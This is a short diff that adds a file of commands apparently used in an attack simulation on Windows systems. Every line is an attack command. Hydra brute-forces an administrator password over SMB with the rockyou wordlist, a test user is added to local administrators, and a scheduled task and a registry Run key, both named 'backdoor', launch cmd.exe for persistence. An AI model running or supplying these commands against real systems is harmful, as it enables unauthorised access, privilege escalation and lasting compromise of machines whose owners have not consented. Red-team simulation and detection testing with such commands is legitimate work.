@@ -1,0 +1,6 @@
+# Commands used in attack simulation
+
+hydra -l administrator -P rockyou.txt smb://1X2.1XX.X6.X
+net localgroup administrators testuser /add
+schtasks /create /sc onlogon /tn backdoor /tr "cmd.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "cmd.exe"
